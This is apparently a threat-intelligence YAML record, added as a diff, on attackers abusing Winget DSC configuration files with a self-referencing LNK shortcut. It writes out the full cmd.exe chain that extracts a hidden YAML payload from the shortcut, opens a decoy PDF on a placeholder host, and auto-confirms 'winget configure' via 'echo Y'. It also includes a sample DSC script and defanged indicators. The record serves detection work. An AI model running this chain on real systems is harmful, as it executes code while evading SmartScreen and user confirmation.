@@ -1,0 +1,52 @@
+title: Winget DSC and Self-Referencing LNK File Attack Explained
+description: Attackers abuse Winget's DSC configuration feature to execute arbitrary
+  PowerShell code through a YAML .winget file, bypassing SmartScreen warnings by running
+  through the trusted process ConfigurationRemotingServer.exe. A self-referencing
+  LNK shortcut is combined with the .winget payload to automatically pass the confirmation
+  prompt via echo Y.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - winget.exe
+  - ConfigurationRemotingServer.exe
+  - cmd.exe
+  command_lines:
+  - C:\Windows\system32\cmd.exe /c "(cd %TMP%\*update.zip* || cd %HOMEPATH%\Downloads\update)
+    & (more +1349 *.lnk > %TMP%\conf.yml) && start https://yourhost.tld/decoy.pdf
+    & winget configure --enable & (echo Y | winget configure -f %TMP%\conf.yml >nul)"
+  - winget configure --enable
+  - echo Y | winget configure -f %TMP%\conf.yml >nul
+  - more +1349 *.lnk > %TMP%\conf.yml
+  powershell:
+  - New-Item -Path "$env:USERPROFILE\Desktop\test.txt" -ItemType File -Value "DSC
+    was here" -Force
+  scripts:
+  - 'properties: configurationVersion: 0.2.0 resources: - resource: PSDscResources/Script
+    directives: description: Write a test file to Desktop settings: SetScript: ''New-Item
+    -Path "$env:USERPROFILE\Desktop\test.txt" -ItemType File -Value "DSC was here"
+    -Force'' GetScript: ''$false'' TestScript: ''$false'''
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - cmd.exe -> yourhost[.]tld:443
+  file_activity:
+  - '%TMP%\conf.yml'
+  persistence: []
+  process_relations:
+  - winget.exe -> ConfigurationRemotingServer.exe
+  - cmd.exe -> winget.exe
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - yourhost[.]tld
+  urls:
+  - hxxps://yourhost[.]tld/decoy.pdf
+  - hxxps://www.zerosalarium[.]com/2024/12/LOLBIN%20WinGet%20execute%20PowerShell%20script.html
+  - hxxps://blog.compass-security[.]com/2026/03/winget-desired-state-initial-access-established/
+authors: []
+reference: https://www.picussecurity.com/resource/blog/winget-dsc-and-self-referencing-lnk-file-attack-explained
+date_of_publication: June 17, 2026
+file_creation_date: June 17, 2026
